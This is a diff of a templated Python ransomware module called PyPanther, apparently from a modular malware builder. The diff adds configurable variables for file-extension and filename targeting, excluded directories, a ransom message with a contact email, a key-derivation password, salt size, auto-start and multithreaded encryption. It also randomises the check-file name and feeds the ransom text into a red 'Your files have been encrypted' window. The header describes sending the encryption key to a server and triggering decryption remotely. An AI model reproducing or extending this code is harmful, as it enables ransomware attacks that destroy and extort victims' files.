@@ -1,15 +1,20 @@
 #!name##PyPanther
 #!itemType##module
 #!fileType##PY_MOD
-#!info##A Python-based ransomware module. It searches for selected files, starts encrypting them, displays a notification window, and creates a file on the desktop. It generates an encryption key, strengthens it with an additional password, and sends it to the server. Supports two operation modes: Silent mode, which encrypts files one by one with timed intervals. Fast mode, which encrypts multiple files in parallel for maximum speed.
+#!info##A ransomware module written in Python. It encrypts files, sends the encryption key to the server, and displays a popup window informing about the infection with an input field for the decryption key; decryption can also be triggered remotely. Files are indexed using three filters: by file extensions, by ignoring specific substrings in directory names, and by checking whether a given string appears in the filename. Warning: use caution during testing, as you may encrypt your own files.
 #!hiveType##PyExM
 #!lang##python
 #!pyType##module
-#!Var##PAN_file_ext##jpg##file extension
-#!Var##PAN_file_name##*##file name
-#!Var##PAN_ban_dir##.vscode, lib, pkp, .cache##Banned dir name
-#!Var##PAN_auto_start##True##Auto start encryption
-#!Var##PAN_encrypt##fast##Encryption speed
+#!Var##PAN_file_ext##jpg##File extensions to search for. List extensions separated by commas ",". Using "*" in this parameter disables extension filtering entirely.##str
+#!Var##PAN_file_name##*##Files are indexed based on the presence of specified words in their filenames. Enter names separated by commas ",". Using "*" in this parameter causes filenames to be ignored.##str
+#!Var##PAN_ban_dir##.vscode, lib, pkp, .cache##Directory names to ignore during scanning. By default, directories such as "windows", "temp", "venv", etc. are ignored. Adding custom directories will extend the default ignore list. If you want no directories to be considered at all (including defaults), use "*". If you want only the default ignored directories, leave this field empty (default behavior). Separate custom directory names with commas ",".
+#!Var##Pan_messages##If you want to recover your files contact: example@gmail.com##The message that will be displayed in the window when all files are encrypted.
+#!Var##PAN_auto_start##True##Determines whether encryption starts automatically on launch or must be triggered remotely. Accepted values are "True" or "False".##str
+#!Var##PAN_password##supersecretpassword##A string of characters (password) that will be used to generate the encryption key.##str
+#!Var##PAN_salt_size##16##Size of salt attached to the password. Typical value: 8, 16, 32##str
+#!Var##PAN_enc_ext##.encrypted##File extension of encrypted files.##str
+#!Var##PAN_encrypt##fast##Encryption mode. "slow" - Files are encrypted sequentially, one by one. "fast" - Files are encrypted concurrently using multiple threads.
+#!Var##PAN_th_num##20##Number of threads used for encryption when operating in "fast" mode.##str
 
 {% set PAN_FILE_EXT = pyTOOL.buildListStr(PAN_file_ext, ",") %}
 {% set PAN_FILE_NAME = pyTOOL.buildListStr(PAN_file_name, ",") %}
@@ -207,18 +212,19 @@ class PyPanther:
     def __init__(self, worm: object):
         self.worm = worm
         self.niffler = Niffler()      
-        self.CHECK_FILE_NAME = "AlaMaKota.txt"
+        self.CHECK_FILE_NAME = "{{randTOOL.genString(14)}}.txt"
         self.CHECK_FILE_PATH = self.buildCheckWorkPath()
         self.FLAG_decryption_working = False
         self.KEY = None
-        self.SALT_SIZE = 16
-        self.ENCYRPT_FILE_EXT = ".encrypted"
-        self.PASSWORD = "supersafepassword"
+        self.SALT_SIZE = {{PAN_salt_size}}
+        self.ENCYRPT_FILE_EXT = "{{PAN_enc_ext}}"
+        self.PASSWORD = "{{PAN_password}}"
         self.PAUSE_CHECK = 1
         self.PAUSE_BEFORE_START = 2
         self.AUTO_START = {{PAN_AUTO_START}}
         self.FAST_ENCRYPTION = {{PAN_ENCRYPT}}
-        self.FAST_MODE_TH = 3
+        self.FAST_MODE_TH = {{PAN_th_num}}
+        self.TEXT_ENCRYPTION = "{{PAN_messages}}"
 
     
 
@@ -272,11 +278,11 @@ class PyPanther:
     def _buildWarnWindow(self) -> None:
         window = tkinter.Tk()
         window.geometry("800x500")
-        window.title("PANTHER")
+        window.title(self.worm.name)
         window.configure(bg="red")
         mlabel = tkinter.Label(window, text="!!! Your files have been encrypted !!!", font=("Arial", 26), fg="black", bg="red")
         mlabel.pack(pady=25)
-        tlabel = tkinter.Label(window, text="ALA MA KOTA", font=("Arial", 16))
+        tlabel = tkinter.Label(window, text=self.TEXT_ENCRYPTION, font=("Arial", 16))
         tlabel.pack(pady=30)
         elabel = tkinter.Label(window, text="", bg="red", font=("Arial", 14), fg="black")
         elabel.pack(pady=60)
